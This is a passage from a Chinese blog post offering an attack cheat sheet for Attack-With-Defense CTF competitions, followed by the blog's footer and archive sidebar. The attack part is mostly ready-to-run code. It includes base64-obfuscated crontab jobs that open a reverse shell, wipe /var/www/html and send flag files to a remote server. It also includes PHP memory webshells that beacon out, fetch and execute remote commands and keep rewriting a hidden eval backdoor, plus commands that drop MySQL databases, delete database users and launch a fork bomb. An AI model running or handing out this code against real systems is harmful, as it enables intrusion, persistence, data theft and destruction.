+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu-virtual-machine:~$ /bin/<span class="built_in">echo</span> KiAqICogKiAqIGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzgwODAgMD4mMScK | /usr/bin/base64 -d | /bin/cat &gt;&gt; /tmp/tmp.conf ; /usr/bin/crontab /tmp/tmp.conf</span><br><span class="line">ubuntu@ubuntu-virtual-machine:~$</span><br><span class="line">ubuntu@ubuntu-virtual-machine:~$ crontab -l</span><br><span class="line">* * * * * bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>crontab删除文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_rm</span><span class="params">(rm_paths=<span class="string">'/var/www/html/'</span>)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'/bin/rm -rf %s'</span>%rm_paths</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span>%cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>crontab提交flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_flag_submit</span><span class="params">(flag_server,flag_port,flag_url,flag_token,flag_path)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">'/tmp'</span></span><br><span class="line">    cmd = <span class="string">'/usr/bin/wget "http://%s:%s/%s" -d "token=%s&amp;flag=$(/bin/cat %s)" '</span> %(flag_server,flag_port,flag_url,flag_token,flag_path)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * %s\n"</span>%cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line">  </span><br><span class="line">cmd = crontab_flag_submit(flag_server=<span class="string">'172.16.132.2'</span>,flag_port=<span class="string">'8088'</span>,flag_url=<span class="string">'submit'</span>,flag_token=<span class="string">'bcbe3365e6ac95ea2c0343a2395834dd'</span>,flag_path=<span class="string">'/flag'</span>)</span><br><span class="line">print(cmd)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>…</p>
+</li>
+</ul>
+<h5 id="PHP型内存马"><a href="#PHP型内存马" class="headerlink" title="PHP型内存马"></a>PHP型内存马</h5><p>内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。要杀死这种内存马，在root权限下只需要重启Apache或者nginx即可。而在线下赛中，我们往往没有root权限。因此，我们一般得通过www-data用户进行杀马。</p>
+<blockquote>
+<p> 杀马，kill -9 -1 杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；</p>
+<p>ps -aux|grep ‘www-data’|awk ‘{print $2}’|xargs kill -9</p>
+</blockquote>
+<ol>
+<li><p>回送flag+自动提交flag+回连任意代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$message=<span class="string">"* * * * * curl 192.168.136.1:8098/?flag=$(cat /flag)&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY"</span>;</span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    $x =file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line">	file_get_contents(<span class="string">'http://192.168.136.1:8099/test.php?token=moxiaoxi&amp;flag='</span>.$x);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    system(<span class="string">"echo '$message' &gt; /tmp/1 ;"</span>);</span><br><span class="line">    system(<span class="string">"crontab /tmp/1;"</span>);</span><br><span class="line">    system(<span class="string">"rm /tmp/1;"</span>);</span><br><span class="line">    $c=file_get_contents(<span class="string">'http://192.168.136.1:8100/1.txt'</span>);</span><br><span class="line">    system($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>覆盖写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">	$path = <span class="string">"/var/www/html/css/.moxiaoxi2.php"</span>;</span><br><span class="line">	$data = <span class="string">"&lt;?php @eval(\$_POST['moxiaoxi']);?&gt;"</span>;</span><br><span class="line">    @file_put_contents($path, $data);</span><br><span class="line">    system(<span class="string">'chmod 777 '</span>.$path);</span><br><span class="line">    usleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里讲一下二进制马，我至今还没找到那种可以动态变pid，而且执行速度超快的二进制马。所以，在当下看来，二进制马作用其实不大，因为所有的二进制马都可以通过杀死内存马的方式杀掉，就显得很鸡肋。如果后面发现了这种快速执行的骚马，可以拿出来讲一讲。</p>
+</blockquote>
+</li>
+</ol>
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ol>
+<li><p>数据库相关</p>
+<p>删除数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm_db</span><span class="params">(db_user,my_db_passwd)</span>:</span></span><br><span class="line">    cmd = <span class="string">"/usr/bin/mysql -h localhost -u%s %s -e '"</span>%(db_user,my_db_passwd)</span><br><span class="line">    db_name = [<span class="string">'performance_schema'</span>,<span class="string">'mysql'</span>,<span class="string">'flag'</span>]</span><br><span class="line">    <span class="keyword">for</span> db <span class="keyword">in</span> db_name:</span><br><span class="line">        cmd += <span class="string">"drop database %s;"</span>%db</span><br><span class="line">    cmd += <span class="string">"'"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
+<p>修改用户信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=PASSWORD(&apos;hi23333&apos;);# 修改所有用户密码</span><br><span class="line">flush privileges;</span><br><span class="line">UPDATE mysql.user SET User=&apos;aaaaaaaaaaaa&apos; WHERE user=&apos;root&apos;; </span><br><span class="line">flush privileges;</span><br><span class="line">delete from mysql.user ;#删除所有用户</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>fork炸弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/<span class="built_in">echo</span> <span class="string">'.() &#123; .|.&amp; &#125; &amp;&amp; .'</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>滥用杀死不死马脚本，不停kill apache2，造成dos</p>
+</li>
+<li><p>大量发送长度超长的脚本，造成dos</p>
+</li>
+<li><p>mysql sleep型dos</p>
+</li>
+<li><p>所有的正向shell可以自己写一段简单的python脚本进行控制与管理，而反向shell可以使用<a href="https://github.com/WangYihang/Reverse-Shell-Manager" target="_blank" rel="noopener">王一航写的反向shell管理器</a>.现在的反向shell管理器还存在一些bug。</p>
+</li>
+<li><p>….</p>
+</li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://ethancck.github.io">Ethan</a>
+            </p><p>原文链接：<a href="https://ethancck.github.io/2019/04/02/AWD线下准备指南/">https://ethancck.github.io/2019/04/02/AWD线下准备指南/</a>
+            </p><p>发表日期：<a href="https://ethancck.github.io/2019/04/02/AWD线下准备指南/">April 2nd 2019, 3:37:21 pm</a>
+            </p><p>更新日期：<a href="https://ethancck.github.io/2019/04/02/AWD线下准备指南/">May 9th 2019, 4:12:14 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/04/06/PHP之反序列化分析/" title="PHP之反序列化分析">
+                    <div class="nextTitle">PHP之反序列化分析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/03/30/FUZZ测试某狗WAF绕过/" title="FUZZ测试某狗WAF绕过">
+                    <div class="prevTitle">FUZZ测试某狗WAF绕过</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "FuPdFy9xCtoivKmiix3FHb4d-gzGzoHsz",
+        appKey: "pAQSVceyfizzVqhmmyUQeX2j",
+        placeholder: "一起唠嗑:)",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:7989933065@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Ethancck" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/weixin.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/Ethan18977083" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#weevely后门"><span class="toc-number">2.</span> <span class="toc-text">weevely后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#蚁剑及菜刀型后门"><span class="toc-number">3.</span> <span class="toc-text">蚁剑及菜刀型后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#常用的特殊webshell"><span class="toc-number">4.</span> <span class="toc-text">常用的特殊webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#权限维持"><span class="toc-number">5.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#反弹shell"><span class="toc-number">6.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Crontab"><span class="toc-number">7.</span> <span class="toc-text">Crontab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP型内存马"><span class="toc-number">8.</span> <span class="toc-text">PHP型内存马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#其他"><span class="toc-number">9.</span> <span class="toc-text">其他</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 26
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/Xposed 插件开发基础/">Xposed插件开发</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/iscc线下攻防复现/">iscc2018攻防</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href="/2019/05/13/RFI绕过URL包含限制getshell/">RFI绕过URL包含限制getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/phar反序列化拓展攻击浅析/">phar反序列化拓展攻击浅析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/xss启示录/">xss启示录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/curl的一些tircks/">curl的一些tircks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/反序列化的一些tricks/">反序列化的一些tricks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/PHP之反序列化分析/">PHP之反序列化分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/AWD线下准备指南/">AWD线下备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href="/2019/03/30/FUZZ测试某狗WAF绕过/">FUZZ测试某狗WAF绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href="/2019/03/29/WFUZZ使用教程/">WFUZZ使用教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/大话FUZZ测试/">大话FUZZ测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(下)/">php代码审计之函数漏洞审计(下)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(上)/">php代码审计之函数漏洞审计(上)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href="/2019/03/07/CTF命令执行及绕过技巧/">CTF命令执行及绕过技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/Phpstorm+Xdebug动态调试配置/">Phpstorm+Xdebug动态调试配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href="/2018/10/04/python沙盒逃逸/">python 沙盒逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2018/09/02/萌萌哒报名系统/">CTF&&lctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href="/2018/08/29/安卓架构分析/">安卓架构分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href="/2018/08/28/时光/">时光说</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向破解"><span class="iconfont-archer">&#xe606;</span>逆向破解</span>
+    
+        <span class="sidebar-tag-name" data-tags="安卓架构"><span class="iconfont-archer">&#xe606;</span>安卓架构</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="年轻时"><span class="iconfont-archer">&#xe60a;</span>年轻时</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="移动安全"><span class="iconfont-archer">&#xe60a;</span>移动安全</span>
+    
+        <span class="sidebar-category-name" data-categories="系统安全"><span class="iconfont-archer">&#xe60a;</span>系统安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Ethan"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
